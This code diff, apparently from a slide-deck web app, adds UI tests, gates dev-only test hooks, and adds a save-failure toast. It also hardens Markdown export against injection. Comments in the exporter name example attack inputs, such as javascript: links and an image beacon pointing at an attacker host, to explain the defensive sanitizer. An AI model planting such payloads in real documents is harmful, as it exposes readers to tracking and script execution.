+  { name: "test hooks + fx-wrapper present", fn: async () => {
+    if (typeof _hooks().setAIWork !== "function") throw new Error("setAIWork test hook not exposed");
+    if (typeof _hooks().getSelection !== "function") throw new Error("getSelection test hook not exposed");
+    await _cr5Setup();
+    if (!_fxWrap()) throw new Error("no fx-wrapper — diag=" + JSON.stringify({ conceptRows: _$$(".concept-row").length, tocRows: _tocRows().length, vp: !!_$("[data-testid='slide-viewport']"), sel: _hooks().getSelection() }));
+  }},
+  { name: "SET_AI_WORK on the on-screen slide → vera-thinking scan + accent var", fn: async () => {
+    await _settleFx();
+    const sel = _hooks().getSelection();
+    if (!sel) throw new Error("no slide selected");
+    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
+    const w = await _waitFor(() => { const x = _fxWrap(); return x && x.classList.contains("vera-thinking") ? x : null; }, 2500);
+    if (w.getAttribute("data-ai-working") !== "1") throw new Error("data-ai-working mirror not set");
+    // Accent-tinted sweep: --vera-accent must be a non-empty color; when the
+    // slide carries an accent it must equal it (the sweep matches the slide).
+    const acc = getComputedStyle(w).getPropertyValue("--vera-accent").trim();
+    if (!acc) throw new Error("--vera-accent empty while working");
+    if (sel.accent) {
+      // Serialization-tolerant: --vera-accent may come back as rgb(...) once the
+      // custom property is registered, while the deck authors a hex.
+      const a = _normColor(acc), b = _normColor(sel.accent);
+      if (a !== b) throw new Error(`--vera-accent=${acc} (${a}) != slide accent ${sel.accent} (${b})`);
+    }
+    await _settleFx();
+  }},
+  { name: "clearing SET_AI_WORK → vera-thinking gone + magic-reveal settle", fn: async () => {
+    await _settleFx();
+    const sel = _hooks().getSelection();
+    if (!sel) throw new Error("no slide selected");
+    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
+    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
+    _hooks().setAIWork(null);
+    // The completion effect swaps the scan for the one-shot magic-reveal.
+    await _waitFor(() => { const w = _fxWrap(); return w && !w.classList.contains("vera-thinking") && w.classList.contains("magic-reveal"); }, 2500);
+    // …and the reveal is one-shot — it settles back to static.
+    await _waitFor(() => !_fxWrap()?.classList.contains("magic-reveal"), 3000).catch(() => {});
+  }},
+  { name: "off-screen target does NOT animate the on-screen slide", fn: async () => {
+    await _settleFx();
+    const sel = _hooks().getSelection();
+    if (!sel) throw new Error("no slide selected");
+    // A target that is not the on-screen slide (bogus itemId) must leave it static.
+    _hooks().setAIWork({ itemId: "__cr5_no_such_item__", slideIdx: sel.slideIdx });
+    await _wait(250);
+    const w = _fxWrap();
+    if (w && w.classList.contains("vera-thinking")) throw new Error("on-screen slide animated for an off-screen target");
+    await _settleFx();
+  }},
+  { name: "D7: navigating away mid-op does NOT magic-reveal the destination slide", fn: async () => {
+    await _settleFx();
+    const sel = _hooks().getSelection();
+    if (!sel) throw new Error("no slide selected");
+    // Mark THIS slide as the AI target and confirm the working scan is up.
+    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
+    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
+    // Navigate to another slide mid-op (either direction is a slideIndex change).
+    const p0 = _slidePos();
+    document.activeElement?.blur?.();
+    _key("ArrowRight"); await _wait(140);
+    if (_slidePos() === p0) { _key("ArrowLeft"); await _wait(140); }
+    if (_slidePos() === p0) { await _settleFx(); return; } // single-slide deck: nothing to navigate
+    // The destination slide must NOT play the completion settle — the op did not
+    // finish here, the view merely moved. Give the effect ample time to (wrongly) fire.
+    await _wait(400);
+    const w = _fxWrap();
+    if (w && w.classList.contains("magic-reveal")) throw new Error("destination slide wrongly played magic-reveal on mid-op navigation");
+    await _settleFx();
+  }},
+  { name: "D7b: cross-module switch at same index does NOT magic-reveal destination (but genuine same-slide DOES)", fn: async () => {
+    await _settleFx();
+    // Map each TOC slide row to its {itemId, slideIdx} by selecting it.
+    const n = _tocRows().length;
+    if (n < 2) { await _settleFx(); return; } // single-slide deck — nothing to prove
+    const meta = [];
+    for (let i = 0; i < n; i++) { _click(_tocRows()[i]); await _wait(130); meta.push(_hooks().getSelection()); }
+    // Module A = first slide-0 row; Module B = a LATER slide-0 row in a DIFFERENT module.
+    let ai = -1, bi = -1;
+    for (let i = 0; i < meta.length; i++) {
+      if (meta[i] && meta[i].slideIdx === 0) {
+        if (ai < 0) ai = i;
+        else if (meta[i].itemId !== meta[ai].itemId) { bi = i; break; }
+      }
+    }
+    if (ai < 0 || bi < 0) { await _settleFx(); return; } // deck lacks two modules with a slide-0 — soft pass
+    // Select module A slide 0 and start its working scan.
+    _click(_tocRows()[ai]); await _wait(160);
+    const sA = _hooks().getSelection();
+    _hooks().setAIWork({ itemId: sA.itemId, slideIdx: sA.slideIdx });
+    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
+    // Single-step switch to module B slide 0 (same index, different module) while
+    // aiWork is still set on A. The untouched destination must NOT settle.
+    _click(_tocRows()[bi]); await _wait(180);
+    const sB = _hooks().getSelection();
+    if (!sB || sB.itemId === sA.itemId) { await _settleFx(); return; } // switch didn't land — soft pass
+    await _wait(420); // give the completion effect ample time to (wrongly) fire
+    const wB = _fxWrap();
+    if (wB && wB.classList.contains("magic-reveal")) throw new Error("cross-module switch wrongly magic-revealed the untouched destination slide (0===0 index collision)");
+    await _settleFx();
+    // Control: a GENUINE same-slide completion must STILL magic-reveal (not over-suppressed).
+    _click(_tocRows()[ai]); await _wait(160);
+    const sA2 = _hooks().getSelection();
+    _hooks().setAIWork({ itemId: sA2.itemId, slideIdx: sA2.slideIdx });
+    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
+    _hooks().setAIWork(null);
+    await _waitFor(() => { const x = _fxWrap(); return x && x.classList.contains("magic-reveal"); }, 2500);
+    await _settleFx();
+  }},
+  { name: "CSS: accent-tinted .vera-thinking + .magic-reveal rules exist", fn: async () => {
+    const css = _allCssText();
+    if (!/\.vera-thinking/.test(css)) throw new Error(".vera-thinking rule missing");
+    if (!/\.magic-reveal/.test(css)) throw new Error(".magic-reveal rule missing");
+    if (!/--vera-accent/.test(css)) throw new Error(".vera-thinking sweep not parameterized by --vera-accent");
+  }},
+  { name: "CSS: prefers-reduced-motion zeroes the working scan", fn: async () => {
+    let found = false;
+    for (const sheet of Array.from(document.styleSheets)) {
+      let rules; try { rules = sheet.cssRules; } catch { continue; }
+      if (!rules) continue;
+      for (const r of Array.from(rules)) {
+        // CSSMediaRule (type 4) — r.cssText carries the full nested block.
+        const txt = r.cssText || "";
+        if (r.type === 4 && /prefers-reduced-motion/i.test(txt) && /\.vera-thinking/.test(txt) && /animation[^;]*none/i.test(txt)) found = true;
+      }
+    }
+    if (!found) throw new Error("prefers-reduced-motion block zeroing .vera-thinking animation missing");
+  }},
+], { setup: _cr5Setup });
 
 // ━━━ UI TEST RUNNER COMPONENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -15502,8 +17141,86 @@ function deckToMarkdown(state, opts = {}) {
   const ln = (...a) => lines.push(...a);
   const blank = () => { if (lines.length && lines[lines.length - 1] !== "") lines.push(""); };
 
-  // Inline formatting is already markdown — pass through
-  const txt = (t) => (t || "").replace(/\n/g, "  \n");
+  // SECURITY (CWE-116, output encoding at the sink): deck text is emitted into a
+  // MARKDOWN grammar, so it needs Markdown-context encoding — the HTML-tag strip
+  // in sanitizeString does not cover it. Without this, a deck string could embed
+  // `[x](javascript:…)` or a zero-click image beacon `![](https://attacker/…)`
+  // that survives verbatim into the exported .md (the live renderer already
+  // re-validates such inline links via sanitizeUrl in parseInline; this reaches
+  // parity). Defense-in-depth: (1) allowlist link/image DESTINATION schemes via
+  // the same sanitizeUrl gate used everywhere else, and (2) backslash-escape
+  // Markdown metacharacters in any text placed inside a link label.
+  const mdUrl = (u) => { try { return (typeof sanitizeUrl === "function" ? (sanitizeUrl(u) || "") : ""); } catch { return ""; } };
+  // Encode a scheme-validated URL for the Markdown link-DESTINATION context
+  // `(...)`. sanitizeUrl fixes the SCHEME, but that is an HTML-href validator, not
+  // a Markdown-destination encoder: the WHATWG URL parser leaves `)` (and `(`)
+  // unescaped in a path, and the authority-less (mailto:) branch returns the raw
+  // target — so a `)` closes the destination early (letting the trailing bytes
+  // render as a fresh image/link) and a mailto: newline injects block structure.
+  // Percent-encode exactly the bytes that break out of `(...)` — parens,
+  // whitespace/controls, angle brackets, backslash, backtick — leaving a still-
+  // functional URL. Every URL that lands inside `(...)` MUST go through this.
+  const mdDest = (u) => { const s = mdUrl(u); return s ? s.replace(/[\s()<>\\`]/g, (c) => "%" + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, "0")) : ""; };
+  // Free BODY text: keep emphasis (**bold**, *italic*, ~~strike~~) but sanitize
+  // inline [label](target) link targets and NEUTRALIZE image auto-load (the live
+  // renderer never auto-loads text images) — a blocked/opaque scheme collapses
+  // the span to its plain label, an allowed one stays a link (never an image).
+  const mdInline = (t, cell) => {
+    if (t == null) return "";
+    const src = String(t);
+    // Walk the string as alternating INLINE-link spans and the gaps between them.
+    // In each gap, escape every `[`/`]` so Markdown reference-style links/images
+    // ([a][ref], ![a][ref], collapsed/shortcut [ref]) AND their definition lines
+    // ([ref]: url) cannot form: those forms contain no literal `(`, so the inline
+    // rewriter and mdDest never see them and their URL would otherwise reach a .md
+    // viewer unchecked. The live renderer (parseInline) supports only inline links,
+    // so escaping is both safe (same literal text) and parity-correct (CWE-116:
+    // cover the whole grammar, not just the `(...)` form). The escaper ALSO covers
+    // `<`/`>`: Markdown permits RAW HTML and autolinks (`<img src=beacon>`,
+    // `<a href=javascript:…>`, `<scheme:…>`), which need neither `(` nor `[` and
+    // would otherwise reach a .md viewer live — the "parity" argument does not hold
+    // here because the live app renders these fields as escaped React text, not as
+    // markup. Each inline span is scheme-checked + destination-encoded (mdDest), the
+    // leading `!` dropped so an image can only downgrade to a link, and a blocked
+    // scheme collapses to the plain label. The label group is `*?` (empty allowed)
+    // so an empty-alt beacon `![](url)` (which the live renderer ignores) is caught
+    // too, and the surviving label is escaped so it cannot carry raw HTML either.
+    // Backslash is escaped FIRST-CLASS (in the same class), not just the target
+    // metachars: a lone `\` before an escaped char would otherwise revive it —
+    // attacker `\<` -> `\\<` renders as a literal `\` + a LIVE `<`. Escaping `\`
+    // too makes every `\[`/`\]`/`\<`/`\>` unrevivable.
+    // In cell mode `|` joins the class so it is escaped in the SAME pass as
+    // backslash (escaped first-class), not by a separate order-dependent replace.
+    const gapRe = cell ? /[\\\[\]<>|]/g : /[\\\[\]<>]/g;
+    const escGap = (g) => g.replace(gapRe, "\\$&");
+    const re = /!?\[([^\[\]\n]*?)\]\(([^\s)\n]+?)\)/g;
+    let out = "", last = 0, m;
+    while ((m = re.exec(src)) !== null) {
+      out += escGap(src.slice(last, m.index));
+      const safe = mdDest(m[2]);
+      out += safe ? `[${escGap(m[1])}](${safe})` : escGap(m[1]);
+      last = m.index + m[0].length;
+    }
+    out += escGap(src.slice(last));
+    return out.replace(/\n/g, "  \n");
+  };
+  // Text used INSIDE a [ … ] link label: strict metachar escape so a crafted
+  // label cannot break out of, or nest inside, the surrounding link syntax.
+  const mdLabel = (t) => String(t == null ? "" : t).replace(/\n/g, " ").replace(/([\\`*_\[\]()~!<>])/g, "\\$1");
+  // Build a link only when the destination passes the scheme allowlist; a blocked
+  // target degrades to the plain (escaped) label rather than emitting a bad URL.
+  const mdLink = (label, target) => { const s = mdDest(target); return s ? `[${mdLabel(label)}](${s})` : mdLabel(label); };
+  // Table cell: inline-sanitize in CELL mode (escGap escapes `|` alongside
+  // backslash/brackets/angles in one complete pass — no separate, order-dependent
+  // pipe replace), then collapse newlines. A cell cannot inject columns or break
+  // the row grammar, and backslash is not double-escaped.
+  const mdCell = (t) => mdInline(t, true).replace(/\n/g, " ");
+  // Code fence long enough that backtick runs in the content cannot close it.
+  const mdFence = (code) => { const runs = String(code == null ? "" : code).match(/`+/g) || []; const max = runs.reduce((m, r) => Math.max(m, r.length), 0); return "`".repeat(Math.max(3, max + 1)); };
+  // Heading text: inline-sanitize then collapse newlines so a title cannot spill
+  // past its single `#`-prefixed line into injected markdown.
+  const mdHead = (t) => mdInline(t).replace(/\n/g, " ");
+  const txt = mdInline;
 
   const blockToMd = (b, depth = 0) => {
     const indent = "  ".repeat(depth);
@@ -15514,11 +17231,12 @@ function deckToMarkdown(state, opts = {}) {
         ln(`${indent}${"#".repeat(level)} ${txt(b.text)}`);
         break;
       }
-      case "text":
+      case "text": {
         blank();
-        if (b.link) ln(`${indent}${txt(b.text)} — [source](${b.link})`);
-        else ln(`${indent}${txt(b.text)}`);
+        const src = mdDest(b.link);
+        ln(`${indent}${txt(b.text)}${src ? ` — [source](${src})` : ""}`);
         break;
+      }
       case "badge":
         ln(`${indent}**${txt(b.text)}**`);
         break;
@@ -15527,7 +17245,7 @@ function deckToMarkdown(state, opts = {}) {
         for (const item of (b.items || [])) {
           const t = typeof item === "string" ? item : item.text;
           const link = typeof item === "object" ? item.link : null;
-          if (link) ln(`${indent}- [${txt(t)}](${link})`);
+          if (link) ln(`${indent}- ${mdLink(t, link)}`);
           else ln(`${indent}- ${txt(t)}`);
         }
         break;
@@ -15535,8 +17253,8 @@ function deckToMarkdown(state, opts = {}) {
         blank();
         for (const item of (b.items || [])) {
           const title = item.title || "";
-          const sub = item.text ? ` — ${item.text}` : "";
-          if (item.link) ln(`${indent}- [${txt(title)}](${item.link})${sub}`);
+          const sub = item.text ? ` — ${txt(item.text)}` : "";
+          if (item.link) ln(`${indent}- ${mdLink(title, item.link)}${sub}`);
           else ln(`${indent}- ${txt(title)}${sub}`);
         }
         break;
@@ -15544,38 +17262,43 @@ function deckToMarkdown(state, opts = {}) {
         blank();
         ln(`${indent}> ${txt(b.text)}`);
         if (b.author) ln(`${indent}> — ${txt(b.author)}`);
-        if (b.link) ln(`${indent}> [Source](${b.link})`);
+        { const s = mdDest(b.link); if (s) ln(`${indent}> [Source](${s})`); }
         break;
       case "callout":
         blank();
         if (b.title) ln(`${indent}> **${txt(b.title)}**`);
         ln(`${indent}> ${txt(b.text)}`);
-        if (b.link) ln(`${indent}> [Source](${b.link})`);
+        { const s = mdDest(b.link); if (s) ln(`${indent}> [Source](${s})`); }
         break;
       case "metric":
         ln(`${indent}**${txt(b.value)}** ${b.label ? `— ${txt(b.label)}` : ""}`);
-        if (b.link) ln(`${indent}[Source](${b.link})`);
+        { const s = mdDest(b.link); if (s) ln(`${indent}[Source](${s})`); }
         break;
-      case "code":
+      case "code": {
         blank();
         if (b.label) ln(`${indent}*${txt(b.label)}*`);
-        ln(`${indent}\`\`\`${b.lang || ""}`);
+        // Fence longer than any backtick run in the body so `b.text` cannot close
+        // the fence early and inject markdown after it; lang is word-chars only.
+        const fence = mdFence(b.text);
+        const lang = String(b.lang || "").replace(/[^A-Za-z0-9_+.-]/g, "");
+        ln(`${indent}${fence}${lang}`);
         ln(b.text || "");
-        ln(`${indent}\`\`\``);
+        ln(`${indent}${fence}`);
         break;
+      }
       case "table": {
         blank();
         const cols = b.headers || [];
         const rows = b.rows || [];
         if (cols.length) {
-          ln(`${indent}| ${cols.join(" | ")} |`);
+          ln(`${indent}| ${cols.map(mdCell).join(" | ")} |`);
           ln(`${indent}| ${cols.map(() => "---").join(" | ")} |`);
         }
         for (const row of rows) {
           const cells = Array.isArray(row) ? row : (row.cells || []);
-          ln(`${indent}| ${cells.join(" | ")} |`);
+          ln(`${indent}| ${cells.map(mdCell).join(" | ")} |`);
         }
-        if (b.link) ln(`${indent}[Source](${b.link})`);
+        { const s = mdDest(b.link); if (s) ln(`${indent}[Source](${s})`); }
         break;
       }
       case "grid":
@@ -15604,28 +17327,32 @@ function deckToMarkdown(state, opts = {}) {
       case "timeline":
         blank();
         for (const item of (b.items || [])) {
-          const date = item.date ? `**${item.date}** ` : "";
+          const date = item.date ? `**${txt(item.date)}** ` : "";
           ln(`${indent}- ${date}${txt(item.title || "")}${item.text ? ` — ${txt(item.text)}` : ""}`);
         }
         break;
       case "progress":
         blank();
         for (const item of (b.items || [])) {
-          ln(`${indent}- ${txt(item.label || "")}: ${item.value ?? 0}%`);
+          ln(`${indent}- ${txt(item.label || "")}: ${txt(item.value ?? 0)}%`);
         }
         break;
       case "tag-group":
         blank();
-        ln(`${indent}${(b.items || []).map(item => `\`${typeof item === "string" ? item : item.text || item.label || ""}\``).join("  ")}`);
+        ln(`${indent}${(b.items || []).map(item => { const s = String(typeof item === "string" ? item : (item.text || item.label || "")).replace(/[`\n]/g, " "); return `\`${s}\``; }).join("  ")}`);
         break;
-      case "image":
-        if (b.src && !b.src.startsWith("data:")) {
+      case "image": {
+        // Only emit a markdown image for a scheme-allowlisted external src; alt
+        // text is metachar-escaped. A blocked/opaque src degrades to the caption.
+        const isrc = (b.src && !b.src.startsWith("data:")) ? mdDest(b.src) : "";
+        if (isrc) {
           blank();
-          ln(`${indent}![${b.alt || b.caption || ""}](${b.src})`);
+          ln(`${indent}![${mdLabel(b.alt || b.caption || "")}](${isrc})`);
         } else if (b.caption) {
           ln(`${indent}*${txt(b.caption)}*`);
         }
         break;
+      }
       case "divider":
         blank();
         ln(`${indent}---`);
@@ -15635,7 +17362,7 @@ function deckToMarkdown(state, opts = {}) {
   };
 
   // Title
-  ln(`# ${state.deckTitle || "Untitled Deck"}`);
+  ln(`# ${mdHead(state.deckTitle || "Untitled Deck")}`);
   blank();
 
   let slideNum = 0;
@@ -15644,13 +17371,13 @@ function deckToMarkdown(state, opts = {}) {
     blank();
     ln(`---`);
     blank();
-    ln(`# ${lane.title || "Untitled Section"}`);
+    ln(`# ${mdHead(lane.title || "Untitled Section")}`);
     blank();
 
     for (const item of (lane.items || [])) {
       // Module as sub-section
       blank();
-      ln(`## ${item.title || "Untitled Module"}`);
+      ln(`## ${mdHead(item.title || "Untitled Module")}`);
 
       for (const slide of (item.slides || [])) {
         if (slide && slide.hidden) continue; // hidden slides are not exported
@@ -15964,7 +17691,7 @@ function StandaloneHtmlModal({ state, onClose }) {
 }
 
 
-// ─────────────────────────────────────────────────────────────────────────
+// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
 // part-pptx.jsx — native, editable PowerPoint (.pptx) exporter
 //
 // A second emitter over the SAME per-slide primitive IR the vector-PDF path
@@ -18156,7 +19883,7 @@ function MergePatchDialog({ localDeck, patchDeck, onComplete }) {
 
     // Update deck title if user hasn't changed it
     if (patchDeck.deckTitle && localDeck.deckTitle === "Untitled") {
-      merged.deckTitle = patchDeck.deckTitle;
+      merged.deckTitle = sanitizeDeckTitle(patchDeck.deckTitle);
     }
 
     // Store patchId so we don't ask again
@@ -18286,6 +20013,21 @@ export default function App() {
   const _localSyncState = useRef(null);
   _localSyncState.current = state; // always up-to-date
 
+  // ━━━ Desktop save-status (Neutralino) ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  // deck-io reports every save transition through window.__velaOnSaveStatus so
+  // a failed/stalled file write is NEVER silent (the reported Windows bug). Null
+  // outside the desktop shell (artifact / serve.py never emit) → pill hidden.
+  const [saveStatus, setSaveStatus] = useState(() => {
+    try { return (typeof window !== "undefined" && window.__velaSaveState) || null; } catch { return null; }
+  });
+  const [saveFailToast, setSaveFailToast] = useState(false);
+  const saveFailToastTimer = useRef(null);
+  const prevSaveStateRef = useRef(saveStatus && saveStatus.state);
+  // CR3/D6: armed = a failure toast is allowed to fire. It disarms once shown and
+  // only re-arms after a genuine `saved` transition — so reconnecting→failed (with
+  // no successful save in between) never re-raises a dismissed toast.
+  const saveFailToastArmed = useRef(true);
+
   // Expose UI context for channel bridge (browser → Claude Code)
   useEffect(() => {
     if (!VELA_LOCAL_MODE) return;
@@ -18317,28 +20059,49 @@ export default function App() {
     return () => { window.__velaGetCurrentSlide = null; };
   }, []);
 
-  // Test-only affordance: patch the current slide with a studyNotes object.
-  // Used by the Study Notes UI test suite (part-uitest.jsx) to exercise the
-  // offline student-mode renderer without depending on a live API. Always
-  // enabled — state.selectedId / slideIndex are readable in all modes.
+  // VELA:DEV-ONLY:BEGIN
+  // ━━━ Test-only affordances — DEV BUILDS ONLY ━━━━━━━━━━━━━━━━━━━━━
+  // The UI battery drives a handful of states that have no offline UI path
+  // (study notes, block injection, the unified AI-working flag). These are
+  // writable globals, so they are kept off the production surface by TWO
+  // independent layers (ASVS V14.1.3 / V14.2.2):
+  //   1. runtime gate — installed only in local/desktop mode, or when a test
+  //      harness explicitly opts in by setting window.__velaTestMode BEFORE
+  //      the app boots (vela-drive.js does this via addInitScript);
+  //   2. build-time strip — concat.py --release drops this whole fenced block,
+  //      so a release bundle carries no test-hook code at all.
+  // Keep every test affordance inside the fence, and keep the fenced code free
+  // of anything the app itself depends on.
   useEffect(() => {
-    window.__velaTestInjectStudyNotes = (studyNotes) => {
+    if (!velaTestSurfaceEnabled()) return;
+    const _patchCurrent = (patch) => {
       const s = _localSyncState.current;
       if (!s || !s.selectedId) return false;
-      dispatch({ type: "UPDATE_SLIDE", id: s.selectedId, index: s.slideIndex, patch: { studyNotes }, merge: true });
+      dispatch({ type: "UPDATE_SLIDE", id: s.selectedId, index: s.slideIndex, patch, merge: true });
       return true;
     };
-    // Test-only: replace the current slide's blocks (used by the Editor UX
-    // alignment test — CR2 — to place a known centered heading and assert it
-    // renders centered in the editor path). No-op in production (unused).
-    window.__velaTestInjectBlocks = (blocks, extra) => {
-      const s = _localSyncState.current;
-      if (!s || !s.selectedId) return false;
-      dispatch({ type: "UPDATE_SLIDE", id: s.selectedId, index: s.slideIndex, patch: { blocks, ...(extra || {}) }, merge: true });
-      return true;
+    window.__velaTestHooks = {
+      // Patch the current slide with a studyNotes object — lets the Study Notes
+      // suite exercise the offline student-mode renderer without a live API.
+      injectStudyNotes: (studyNotes) => _patchCurrent({ studyNotes }),
+      // Replace the current slide's blocks (Editor UX / alignment suites: place
+      // a known centered heading and assert the editor path renders it centered).
+      injectBlocks: (blocks, extra) => _patchCurrent({ blocks, ...(extra || {}) }),
+      // On-screen slide identity {itemId, slideIdx, accent} for assertions.
+      getSelection: () => {
+        const s = _localSyncState.current;
+        if (!s || !s.selectedId) return null;
+        let accent = null;
+        for (const l of (s.lanes || [])) { const it = (l.items || []).find((i) => i.id === s.selectedId); if (it) { accent = it.slides?.[s.slideIndex]?.accent || null; break; } }
+        return { itemId: s.selectedId, slideIdx: s.slideIndex, accent };
+      },
+      // Drive the unified AI-working flag without a live AI backend, so the
+      // vera-thinking / magic-reveal contract is assertable offline.
+      setAIWork: (value) => { dispatch({ type: "SET_AI_WORK", value: value || null }); return true; },
     };
-    return () => { window.__velaTestInjectStudyNotes = null; window.__velaTestInjectBlocks = null; };
+    return () => { window.__velaTestHooks = null; };
   }, [dispatch]);
+  // VELA:DEV-ONLY:END
 
   // Send deck changes to local server (browser → file)
   useEffect(() => {
@@ -18405,6 +20168,40 @@ export default function App() {
     };
     return () => { window.__velaReceiveDeckUpdate = null; };
   }, []);
+
+  // Desktop save-status: subscribe to deck-io's transitions (wired by nl-boot).
+  // Installed only where a shell actually feeds the channel — the desktop /
+  // local-preview build (VELA_LOCAL_MODE), or a host that already published a
+  // status before mount (nl-boot mirrors the latest into window.__velaSaveState,
+  // and the headless harness seeds a falsy-but-present value to opt the UI
+  // battery in). The hosted artifact matches none of these, so it never gains a
+  // writable global that can push arbitrary UI state.
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    if (!(VELA_LOCAL_MODE || window.__velaSaveState != null)) return;
+    window.__velaOnSaveStatus = (s) => setSaveStatus(s || null);
+    if (window.__velaSaveState) setSaveStatus(window.__velaSaveState);
+    return () => { if (window.__velaOnSaveStatus) window.__velaOnSaveStatus = null; };
+  }, []);
+
+  // One-shot toast on the FIRST transition into a failed save, so a user not
+  // watching the header still notices. The header pill is the persistent signal;
+  // the toast auto-dismisses. Re-arms only after a subsequent successful save.
+  useEffect(() => {
+    const cur = saveStatus && saveStatus.state;
+    const prev = prevSaveStateRef.current;
+    if (cur === "failed" && prev !== "failed" && saveFailToastArmed.current) {
+      setSaveFailToast(true);
+      saveFailToastArmed.current = false; // stay disarmed until a real successful save
+      clearTimeout(saveFailToastTimer.current);
+      saveFailToastTimer.current = setTimeout(() => setSaveFailToast(false), 8000);
+    } else if (cur === "saved") {
+      setSaveFailToast(false);
+      saveFailToastArmed.current = true; // genuine success re-arms the one-shot toast
+    }
+    prevSaveStateRef.current = cur;
+  }, [saveStatus]);
+  useEffect(() => () => clearTimeout(saveFailToastTimer.current), []);
 
   // ━━━ Change tracking (since last load/export) ━━━━━━━━━━━━━━━━━━━
   const snapshotRef = useRef(new Map()); // moduleId → JSON string of slides
@@ -18532,6 +20329,13 @@ export default function App() {
         if (data && data._version === 3) {
           // v3: full deck in one key
           delete data._version;
+          // Re-sanitize slide content and branding read back from storage —
+          // see resanitizeLoadedLanes / resanitizeLoadedBranding (F-11
+          // backstop, part-imports.jsx). Only touch the key if the stored deck
+          // actually carries one, so a deck with no branding field at all keeps
+          // that exact shape through the LOAD spread. (v13.26 / v13.27)
+          data.lanes = resanitizeLoadedLanes(data.lanes);
+          if ("branding" in data) data.branding = resanitizeLoadedBranding(data.branding);
           dispatch({ type: "LOAD", payload: data });
           loadedDeck = data;
         } else if (data && data._version === 2) {
@@ -18554,6 +20358,13 @@ export default function App() {
             })),
           };
           delete payload._version;
+          // Re-sanitize slide content and branding read back from storage —
+          // see resanitizeLoadedLanes / resanitizeLoadedBranding (F-11
+          // backstop, part-imports.jsx). Only touch the key if the stored deck
+          // actually carries one, so a deck with no branding field at all keeps
+          // that exact shape through the LOAD spread. (v13.26 / v13.27)
+          payload.lanes = resanitizeLoadedLanes(payload.lanes);
+          if ("branding" in payload) payload.branding = resanitizeLoadedBranding(payload.branding);
           dispatch({ type: "LOAD", payload });
           loadedDeck = payload;
           // Clean up old distributed keys in background
@@ -18563,6 +20374,13 @@ export default function App() {
           }, 3000);
         } else if (data) {
           // v1 legacy monolithic
+          // Re-sanitize slide content and branding read back from storage —
+          // see resanitizeLoadedLanes / resanitizeLoadedBranding (F-11
+          // backstop, part-imports.jsx). Only touch the key if the stored deck
+          // actually carries one, so a deck with no branding field at all keeps
+          // that exact shape through the LOAD spread. (v13.26 / v13.27)
+          data.lanes = resanitizeLoadedLanes(data.lanes);
+          if ("branding" in data) data.branding = resanitizeLoadedBranding(data.branding);
           dispatch({ type: "LOAD", payload: data });
           loadedDeck = data;
         }
@@ -18582,7 +20400,7 @@ export default function App() {
           dbg("[PATCH] New version detected:", STARTUP_PATCH._patchId, "vs stored:", loadedDeck._lastPatchId);
           try {
             const sanitized = validateAndSanitizeDeck(STARTUP_PATCH);
-            sanitized.deckTitle = STARTUP_PATCH.deckTitle || "Untitled";
+            sanitized.deckTitle = sanitizeDeckTitle(STARTUP_PATCH.deckTitle);
             sanitized._patchId = STARTUP_PATCH._patchId;
             setMergeDialog({ localDeck: loadedDeck, patchDeck: sanitized });
           } catch (e) { dbg("[PATCH] Sanitize failed:", e); }
@@ -18730,7 +20548,7 @@ export default function App() {
         else if (raw.lanes) { deckData = raw; deckName = raw.deckTitle || "Imported"; }
         else throw new Error("Unrecognized format");
         const sanitized = validateAndSanitizeDeck(deckData);
-        sanitized.deckTitle = deckName;
+        sanitized.deckTitle = sanitizeDeckTitle(deckName);
         dispatch({ type: "LOAD", payload: sanitized });
         dispatch({ type: "DESELECT" });
         selectFirstModule();
@@ -18800,6 +20618,19 @@ export default function App() {
     return <div style={{ width: "100vw", height: "100vh", background: T.bg }} />;
   }
 
+  // In-app TEST panels (render battery + UI battery runner). Declared null here
+  // and assigned only inside the fence, so a release build keeps a valid `null`
+  // with no reference to the gate or the panels — the same declare-outside /
+  // assign-inside shape part-uitest.jsx uses for its _hooks stub. These mounted
+  // on every non-presentation boot before v13.25, which meant a hosted artifact
+  // ran the render battery at startup and registered the UI battery's Ctrl+Alt+T
+  // and custom-event triggers. Both are test affordances; neither belongs on a
+  // surface an untrusted deck shares.
+  let devTestPanels = null;
+  // VELA:DEV-ONLY:BEGIN
+  if (velaTestSurfaceEnabled()) devTestPanels = <><VelaBatteryTest /><VelaUITestRunner /></>;
+  // VELA:DEV-ONLY:END
+
   return (
     <IconPickerContext.Provider value={openIconPicker}>
     <div style={{ width: "100vw", height: "100vh", display: "flex", flexDirection: "column", background: T.bg, color: T.text, fontFamily: FONT.body, overflow: "hidden", position: "relative" }}
@@ -18814,11 +20645,44 @@ export default function App() {
         </div>
       </div>}
 
+      {/* One-shot save-failure toast (desktop). The header pill is the persistent signal; this just catches the eye once. */}
+      {saveFailToast && <div data-testid="save-failed-toast" style={{ position: "fixed", left: 16, bottom: 16, zIndex: 100000, maxWidth: 340, background: T.bgPanel, border: `1px solid ${T.red}`, borderLeft: `3px solid ${T.red}`, borderRadius: 8, boxShadow: "0 12px 40px rgba(0,0,0,0.4)", padding: "12px 14px", display: "flex", flexDirection: "column", gap: 6, fontFamily: FONT.body }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+          <span style={{ color: T.red, fontSize: 14, fontWeight: 700 }}>Save failed</span>
+          <div style={{ flex: 1 }} />
+          <span onClick={() => setSaveFailToast(false)} title="Dismiss" style={{ cursor: "pointer", color: T.textDim, fontSize: 14, lineHeight: 1 }}>{"✕"}</span>
+        </div>
+        {/* The desktop shell hands us {state, at, name} — a basename only, never an absolute path. */}
+        <div style={{ fontSize: 12, color: T.textMuted }}>Vela couldn't write to {saveStatus && saveStatus.name ? <span style={{ fontFamily: FONT.mono }}>{saveStatus.name}</span> : "your file"}. Your work is safe in the app.</div>
+        <div style={{ display: "flex", gap: 8, marginTop: 2 }}>
